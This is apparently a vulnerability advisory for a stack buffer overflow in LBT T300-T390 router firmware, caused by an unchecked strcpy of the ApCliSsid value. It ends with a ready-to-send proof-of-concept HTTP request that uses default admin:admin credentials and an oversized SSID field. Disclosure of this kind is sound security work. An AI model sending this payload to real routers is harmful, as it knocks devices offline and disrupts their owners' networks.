# LBT router makeCurReoteApList function stack overflow vulnerability

> vendor:LBT
>
> product:T300-T390
>
> version:v2.2.1.8
>
> type:Stack Overflow

## Vulnerability Description

LBT T300-T390 were discovered to contain a stack overflow via the ApCliSsid parameter in the makeCurRemoteApList function.

## Vulnerability Details

There is a stack overflow in the ApCliSsid variable in the makeCurRemoteApList function in the Rc program. The rc program is started through its symbolic link init. This variable is obtained through the system nvram_get function and is passed directly to the strcpy dangerous function without processing, causing a stack buffer overflow based on v13, you can pass in the request package parameters by modifying the apclient_scan.asp page, thereby causing a denial of service attack.

The calling process of the overflow function is as follows:

Main()->sysK_main()->scanApAutoConnect()->makeCurRemoteApList()

![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/5f8c944d-dd0d-4471-a684-cdffc71c6335)


## POC

    POST /apply.cgi HTTP/1.1
    Host: 192.168.10.1
    Content-Length: 697
    Cache-Control: max-age=0
    Authorization: Basic YWRtaW46YWRtaW4=
    Upgrade-Insecure-Requests: 1
    Origin: http://192.168.10.1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://192.168.10.1/apclient_scan.asp
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Connection: close

    submit_button=apclient_scan&change_action=&wan_proto=9&action=Apply&wan_dns_enable=1&ApCliEnable=1&ApCliBssid=&ApCliChannel=6&ApClientBridgeEnable=1&wr_ApClientBridgeEnable=on&ApCliSsid=Remote_AP_SSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ApCliAuthMode=OPEN&ApCliEncrypType=NONE&ApCli_wl_wep_len=0&ApCliDefaultKeyID=1&ApCliKey1Type=0&ApCliKey1Str=**********&ApCliKey2Type=0&ApCliKey2Str=**********&ApCliKey3Type=0&ApCliKey3Str=**********&ApCliKey4Type=0&ApCliKey4Str=**********&ApCliWPAEncrypType=TKIP&ApCliWPAPSK=12345678

   

    
